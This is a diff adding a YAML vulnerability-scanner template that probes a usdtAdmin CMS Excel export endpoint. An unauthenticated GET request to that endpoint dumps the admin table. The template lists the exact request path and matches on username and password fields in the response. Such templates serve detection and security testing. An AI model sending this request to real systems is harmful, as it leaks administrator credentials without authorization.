@@ -1,0 +1,26 @@
+id: poc-yaml-usdtadmin-cms-excel-anyfile-unauthorized-access
+info:
+  name: usdtAdmin CMS Excel Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: unauthorized-access
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index/getway/excel?down=1&table=ea_system_admin&shunxu=desc&number=10"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "USDT数据库ea_system_admin表的数据"
+          - "username"
+          - "password"
+          - "excel"
+      - type: word
+        part: header
+        words:
+          - "filename="
